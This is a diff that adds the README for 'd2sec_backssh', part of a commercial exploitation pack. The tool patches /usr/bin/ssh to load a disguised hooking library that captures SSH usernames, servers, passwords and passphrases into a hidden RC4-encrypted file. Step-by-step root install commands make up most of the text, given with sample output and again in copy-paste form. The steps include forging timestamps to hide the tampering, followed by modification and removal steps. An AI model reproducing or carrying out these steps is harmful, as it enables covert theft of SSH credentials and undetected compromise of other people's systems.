@@ -1,0 +1,174 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2008 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+d2sec_backssh can be used to "sniff" password or passphrase when a user
+uses the ssh client. It logs port (connect() hook), username, remote
+server and passwd/passphrase, then crypts it with rc4 algorithm and
+the key '4ed1479a7a48653b13d492f52ecbe5d6'. It will be saved in the
+/var/tmp/.zman* file.
+
+d2sec_backssh works on platform Linux, Solaris and FreeBSD.
+
+d2sec_backssh (d2sec_infest actually) modifies /usr/bin/ssh and adds
+a sort of preload library to /usr/bin/ssh that hooks read(), write(),
+connect() (to get port) and exit() (to crypt the /var/tmp/.zman* file)).
+
+To decrypt the /var/tmp/.zman* file, you can use the d2sec_drc4 binary.
+
+d2sec_backssh was tested on Linux, Solaris (5.10 x86 and 5.8 sparc) and
+FreeBSD (7.0) with:
+
+- a simple ssh connection (ssh user@ip)
+- with "ssh -i ./id_dsa user@ip" (no passphrase set)
+- with "ssh -i ./id_dsa user@ip" (with passphrase set)
+- with "ssh user@ip /bin/sh"
+- with "-i ./id_dsa" when ssh-agent is running
+- with PAM support (bug on solaris)
+- and scp and sftp supported
+
+Install d2sec_backssh
+-----------------------
+
+In order to install d2sec_backssh, /usr/bin/ssh has to be modified and
+the d2sec_backssh library has to be installed (the following commands
+should be executed in a directory that should be backed up, since it is
+needed if d2sec_backssh has to be removed from the box):
+
+# ls -alp /usr/bin/ssh
+-rwxr-xr-x    1 root     root       230248 Jun 28  2002 /usr/bin/ssh
+# SSH_DIR=/usr/bin/
+# SSH=ssh
+# cp -i "$SSH_DIR/$SSH" "$SSH"
+# ldd "$SSH"
+        libutil.so.1 => /lib/libutil.so.1 (0x40017000)
+        libz.so.1 => /usr/lib/libz.so.1 (0x4001a000)
+        libnsl.so.1 => /lib/libnsl.so.1 (0x4002a000)
+        libcrypto.so.0.9.6 => /usr/lib/libcrypto.so.0.9.6 (0x4003e000)
+        libc.so.6 => /lib/libc.so.6 (0x400fe000)
+        libdl.so.2 => /lib/libdl.so.2 (0x4021b000)
+        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+# ./d2sec_infest "$SSH"
+[+] strtab_offset is 0x000014fc..
+[+] dynamic_offset is 0x00037afc..
+[+] dynamic_size is 0x000000e8..
+[+] needed_offset is 0x00000000..
+[+] debug_offset is 0x00000060..
+[*] util.so.1!
+# ldd "$SSH"
+        util.so.1 => not found
+        libz.so.1 => /usr/lib/libz.so.1 (0x40017000)
+        libnsl.so.1 => /lib/libnsl.so.1 (0x40027000)
+        libcrypto.so.0.9.6 => /usr/lib/libcrypto.so.0.9.6 (0x4003b000)
+        libc.so.6 => /lib/libc.so.6 (0x400fb000)
+        libutil.so.1 => /lib/libutil.so.1 (0x40218000)
+        libdl.so.2 => /lib/libdl.so.2 (0x4021b000)
+        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+# LIB_DIR=/usr/lib
+# LIB=util.so.1
+# touch -r "$LIB_DIR" d2sec_backssh.so
+# cp -i d2sec_backssh.so "$LIB_DIR/$LIB"
+# touch -r d2sec_backssh.so "$LIB_DIR/$LIB"
+# touch -r d2sec_backssh.so "$LIB_DIR"
+# ldd "$SSH"
+        util.so.1 => /usr/lib/util.so.1 (0x40017000)
+        libz.so.1 => /usr/lib/libz.so.1 (0x4001b000)
+        libnsl.so.1 => /lib/libnsl.so.1 (0x4002b000)
+        libcrypto.so.0.9.6 => /usr/lib/libcrypto.so.0.9.6 (0x4003f000)
+        libc.so.6 => /lib/libc.so.6 (0x400ff000)
+        libutil.so.1 => /lib/libutil.so.1 (0x4021c000)
+        libdl.so.2 => /lib/libdl.so.2 (0x4021f000)
+        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+# ls -l "$LIB_DIR/$LIB"
+[...]
+# cp -ip "$SSH_DIR/$SSH" "$SSH.orig"
+# touch -r "$SSH_DIR" "$SSH"
+# rm -f "$SSH_DIR/$SSH" && cp -i "$SSH" "$SSH_DIR/$SSH"
+# touch -r "$SSH.orig" "$SSH_DIR/$SSH"
+# touch -r "$SSH" "$SSH_DIR"
+# ldd "$SSH_DIR/$SSH"
+        util.so.1 => /usr/lib/util.so.1 (0x40017000)
+        libz.so.1 => /usr/lib/libz.so.1 (0x4001b000)
+        libnsl.so.1 => /lib/libnsl.so.1 (0x4002b000)
+        libcrypto.so.0.9.6 => /usr/lib/libcrypto.so.0.9.6 (0x4003f000)
+        libc.so.6 => /lib/libc.so.6 (0x400ff000)
+        libutil.so.1 => /lib/libutil.so.1 (0x4021c000)
+        libdl.so.2 => /lib/libdl.so.2 (0x4021f000)
+        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+# ls -l "$SSH_DIR/$SSH"
+[...]
+
+Now, copy and paste style:
+
+ls -alp /usr/bin/ssh
+SSH_DIR=/usr/bin/
+SSH=ssh
+cp -i "$SSH_DIR/$SSH" "$SSH"
+ldd "$SSH"
+./d2sec_infest "$SSH"
+ldd "$SSH"
+LIB_DIR=/usr/lib
+LIB=util.so.1
+touch -r "$LIB_DIR" d2sec_backssh.so  
+cp -i d2sec_backssh.so "$LIB_DIR/$LIB"
+touch -r d2sec_backssh.so "$LIB_DIR/$LIB"
+touch -r d2sec_backssh.so "$LIB_DIR"
+ldd "$SSH"
+ls -l "$LIB_DIR/$LIB"
+cp -ip "$SSH_DIR/$SSH" "$SSH.orig"
+touch -r "$SSH_DIR" "$SSH"
+rm -f "$SSH_DIR/$SSH" && cp -i "$SSH" "$SSH_DIR/$SSH"
+touch -r "$SSH.orig" "$SSH_DIR/$SSH"
+touch -r "$SSH" "$SSH_DIR"
+ldd "$SSH_DIR/$SSH"
+ls -l "$SSH_DIR/$SSH"
+
+Modify d2sec_backssh
+----------------------
+
+In order to modify the behaviour of d2sec_backssh, only the d2sec_backssh library
+has to be reinstalled (copy and paste style, again):
+
+LIB_DIR=/usr/lib
+LIB=util.so.1
+gcc -Wall -Werror -nostartfiles -fPIC -shared -s -o your_d2sec_backssh.so your_d2sec_backssh.c -ldl
+touch -r "$LIB_DIR" d2sec_backssh.so
+rm -f "$LIB_DIR/$LIB" && cp -i your_d2sec_backssh.so "$LIB_DIR/$LIB"
+touch -r your_d2sec_backssh.so "$LIB_DIR/$LIB"
+touch -r your_d2sec_backssh.so "$LIB_DIR"
+
+Uninstall d2sec_backssh
+-------------------------
+
+In order to remove d2sec_backssh from a box, the following commands
+should be executed in the directory backed up when d2sec_backssh was
+installed (copy and paste style, again and again):
+
+SSH_DIR=/usr/bin
+SSH=ssh
+touch -r "$SSH" "$SSH_DIR"
+cp -ip "$SSH" .
+./d2sec_unifest "$SSH"
+touch -r "$SSH_DIR" "$SSH"
+cp -ip "$SSH" "$SSH_DIR/$SSH"
+touch -r "$SSH" "$SSH_DIR"
+ldd "$SSH_DIR/$SSH"
+ls -l "$SSH_DIR/$SSH"
+LIB_DIR=/usr/lib
+LIB=util.so.1
+rm -f "$LIB_DIR/$LIB"
+touch -r d2sec_backssh.so "$LIB_DIR"
+ls -l "$LIB_DIR/$LIB"
+
+EOF
